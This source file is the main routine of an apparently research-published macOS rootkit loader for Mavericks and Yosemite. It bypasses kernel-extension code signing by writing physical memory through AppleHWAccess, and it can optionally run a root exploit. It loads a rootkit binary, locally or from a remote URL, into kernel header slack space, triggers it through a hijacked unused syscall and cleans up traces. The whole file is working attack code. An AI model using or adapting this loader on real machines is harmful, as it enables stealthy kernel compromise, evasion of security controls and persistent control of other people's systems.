/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.     .----.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'    \_,-.  |
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.        .' .'
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'       .'  /_
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.     |      |
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'     `------'
 *
 * A kernel rootkit load based on AppleHWAccess kernel extension for Yosemite and Mavericks
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * This rootkit loader bypasses kernel extensions code signing requirement by leveraging
 * access to AppleHWAccess.kext, which allows to read/write computer physical memory.
 *
 * main.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#include <sys/types.h>
#include <sys/sysctl.h>

#include "logging.h"
#include "utils.h"
#include "structures.h"
#include "kernel_symbols.h"
#include "rootkit.h"
#include "exploit.h"

void
header(void)
{
    printf(" ____  _                     _   _     \n"
           "|    \\|_|___ ___ ___ ___ ___| |_|_|___ \n"
           "|  |  | | .'| . |   | . |_ -|  _| |  _|\n"
           "|____/|_|__,|_  |_|_|___|___|_| |_|___|\n"
           " _____      |___|  _            ___    \n"
           "|   __|___ ___ _ _|_|___ ___   |_  |   \n"
           "|__   | -_|  _| | | |  _| -_|  |  _|   \n"
           "|_____|___|_|  \\_/|_|___|___|  |___|  \n\n"
           "(c) fG! 2014, 2015\n\n");
}

void
help(const char *name)
{
    printf("\n---[ Usage: ]---\n"
           "%s path_to_rootkit_binary [-x]\n\n"
           "Where path is location of the kext binary to load or remote http/https URI.\n"
           "-x to use Google exploit for privilege escalation, only supported in Mavericks 10.9.5\n", name);
}

int main(int argc, const char * argv[])
{
    @autoreleasepool {
        header();
                
        const char *target_rootkit = NULL;
        if (argc >= 2)
        {
            target_rootkit = argv[1];
        }
        else
        {
            ERROR_MSG("Wrong number of arguments.");
            help(argv[0]);
            return EXIT_FAILURE;
        }

        /* must be run as root if not running in exploit mode */
        if (argc == 2 && getuid() != 0)
        {
            ERROR_MSG("Please run me as root!");
            return EXIT_FAILURE;
        }
        
        int kernel_version = get_kernel_version();
        if (kernel_version < 13)
        {
            ERROR_MSG("This rootkit loader only supports OS X Mavericks or Yosemite.");
            return EXIT_FAILURE;
        }
        
        /* test if the AppleHWService is available, if not we can't proceeed */
        if (service_available() != KERN_SUCCESS)
        {
            return EXIT_FAILURE;
        }

        /* mmap the kernel file so we can process it */
        uint8_t *kernel_buf = NULL;
        size_t kernel_buf_size = 0;
        if (map_kernel_buffer(&kernel_buf, &kernel_buf_size) != KERN_SUCCESS)
        {
            ERROR_MSG("Failed to map kernel file, can't proceed.");
            return EXIT_FAILURE;
        }

        /* to solve kernel symbols we need two things
         * - kernel aslr slide
         * - symbols location
         */
        struct kernel_info kinfo = {0};
        
        /* process the kernel mach-o header to find symbols location */
        if (process_kernel_mach_header(kernel_buf, &kinfo) != KERN_SUCCESS)
        {
            ERROR_MSG("Kernel Mach-O header processing failed.");
            return EXIT_FAILURE;
        }
        
        /* use the exploit if configured to do so */
        if (argc == 3 && strcmp(argv[2], "-x") == 0)
        {
            get_me_r00t(kernel_buf, &kinfo, argv);
        }
        
        /* retrieve kaslr slide */
        size_t kaslr_size = sizeof(kaslr_size);
        uint64_t kaslr_slide = 0;
        get_kaslr_slide(&kaslr_size, &kaslr_slide);
        kinfo.kaslr_slide = kaslr_slide;
        OUTPUT_MSG("[INFO] Kernel ASLR slide is 0x%llx", kaslr_slide);

        /* retrive amount of physical memory */
        uint64_t available_mem = 0;
        size_t len  = sizeof(available_mem);
        if (sysctlbyname("hw.memsize", &available_mem, &len, NULL, 0) != 0)
        {
            ERROR_MSG("Failed to retrieve available memory.");
            return EXIT_FAILURE;
        }
        
        OUTPUT_MSG("[INFO] Available physical memory: %lld bytes", available_mem);
        
        /* find where the kernel is located
         * usually there are two hits, the header that was loaded without ASLR value
         * and then the full kernel with its headers ASLR'ed
         * we can use this fact to "easily" find the right version
         */
        uint64_t kernel_phy_addr = 0;
        
        if (find_kernel_smart(kernel_buf, &kinfo, &kernel_phy_addr) != KERN_SUCCESS)
        {
            /* NOTE: this only works inside a VM, real hardware you will get into machine check exceptions land */
            if (find_kernel_bruteforce(kernel_buf, &kinfo, &kernel_phy_addr) != KERN_SUCCESS)
            {
                ERROR_MSG("Can't find kernel location!");
                return EXIT_FAILURE;
            }
        }

        /* kernel physical address was found, we can hack stuff around */
        if (kernel_phy_addr != 0)
        {
            /* these vars are for cleanup purposes */
            struct rk_info rk_info = {0};
            rk_info.kernel_phys_addr = kernel_phy_addr;
            /* an unused syscall will be used to trigger our payloads */
            if (find_kernel_sysent(kernel_buf, &kinfo, &rk_info) != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to find sysent location.");
                return EXIT_FAILURE;
            }
            /* technique:
             * instead of finding and allocating free space (involves messing with physical memory maps and so on)
             * we can instead use the kernel header slack space to install the rootkit there or code to bootstrap the rootkit
             * the header is executable but not writable
             * in this case it doesn't matter because we write directly to physical memory, bypassing those protections
             * but it matters for the rootkit because of the data sections that need to be writable
             * we can solve this by disabling CR0 write protection when we start the rootkit
             */

            if (install_rootkit(target_rootkit, &kinfo, &rk_info) != KERN_SUCCESS)
            {
                ERROR_MSG("Failed to install rootkit.");
                return EXIT_FAILURE;
            }

            /* start the rootkit via the syscall */
            OUTPUT_MSG("-----[ Starting rootkit ]-----");
            start_kernel_code();
            /* cleanup */
            cleanup_rootkit_traces(&rk_info);
        }
    }
    return 0;
}
